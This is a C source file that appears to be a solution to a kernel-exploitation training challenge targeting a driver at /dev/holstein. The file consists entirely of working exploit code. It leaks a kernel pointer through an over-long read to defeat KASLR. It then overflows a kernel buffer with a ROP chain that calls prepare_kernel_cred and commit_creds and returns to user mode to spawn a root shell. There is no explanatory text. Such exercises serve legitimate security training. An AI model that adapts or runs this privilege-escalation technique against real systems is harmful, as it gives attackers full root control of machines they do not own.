#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rflags, user_rsp;
unsigned long image_base = 0;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

#define prepare_kernel_cred 0x6e240
#define commit_creds 0x6e390
#define pop_rdi 0x27bbdc
#define pop_rcx 0x32cdd3
#define mov_rdi_rax_rep 0x60c96b
#define swapgs_restore_regs_and_return_to_usermode 0x800e26

int global_fd;

static void leak() {
    char buf[0x500];
    read(global_fd, buf, 0x410);
    unsigned long leak = *(unsigned long *)&buf[0x408];
    image_base = leak - 0x13d33c;
    printf("[+] image_base: 0x%016lx\n", image_base);

    return;
}

static void exploit() {
    char buf[0x500];
    memset(buf, 'A', 0x408);
    unsigned long *rop = (unsigned long *)&buf[0x408];
    *rop++ = image_base + pop_rdi;
    *rop++ = 0;
    *rop++ = image_base + prepare_kernel_cred;
    *rop++ = image_base + pop_rcx;
    *rop++ = 0;
    *rop++ = image_base + mov_rdi_rax_rep;
    *rop++ = image_base + commit_creds;
    *rop++ = image_base + swapgs_restore_regs_and_return_to_usermode;
    *rop++ = 0xdeadbeef; // rax
    *rop++ = 0xcafebabe; // [rdi]
    *rop++ = (unsigned long)&win; // [rdi + 0x10]
    *rop++ = user_cs; // [rdi + 0x18]
    *rop++ = user_rflags; // [rdi + 0x20]
    *rop++ = user_rsp; // [rdi + 0x28]
    *rop++ = user_ss; // [rdi + 0x30]    

    write(global_fd, buf, (void *)rop - (void *)buf);

    return;
}

int main() {    
    save_state();

    global_fd = open("/dev/holstein", O_RDWR);

    leak();
    exploit();

    close(global_fd);

    return 0;
}